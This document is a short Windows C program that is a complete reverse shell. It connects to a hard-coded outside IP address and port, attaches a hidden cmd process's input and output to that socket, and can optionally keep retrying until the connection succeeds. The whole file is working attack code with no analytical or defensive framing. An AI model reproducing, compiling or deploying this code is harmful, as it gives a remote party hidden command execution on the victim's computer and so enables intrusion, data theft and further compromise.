#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define CLIENT_IP (char*)"190.100.60.201"
#define CLIENT_PORT (int) 9051

int main(void)
{
	WSADATA wsaData; //Defines windows socket struct
	if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		write(2, "[ERROR} WSAStartup failed.\n", 27);
		return(1);
	}
	int port = CLIENT_PORT;

	struct sockaddr_in sock;
	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);
	sock.sin_addr.s_addr = inet_addr(CLIENT_IP);

#ifdef WAIT_FOR_CLIENT
	while (connect(sockt, (struct sockaddr *) &sock, sizeof(sock)) != 0) {
		Sleep(5000);
	}
#else
	if (connect(sockt, (struct sockaddr *) &sock, sizeof(sock)) != 0) {
		write(2, "[ERROR] connect failed.\n", 24);
		return (1);
	}
#endif

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo); //initializes the struct size
	sinfo.dwFlags = (STARTF_USESTDHANDLES); 
	sinfo.hStdInput = (HANDLE)sockt; //Reading input from the given socket.
	sinfo.hStdOutput = (HANDLE)sockt; //Writing output to the socket
	sinfo.hStdError = (HANDLE)sockt; //Writing error to the socket. A lot like the C example. 
	PROCESS_INFORMATION pinfo;
	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo); //Creates the running reverse shell process.

	return (0);
}
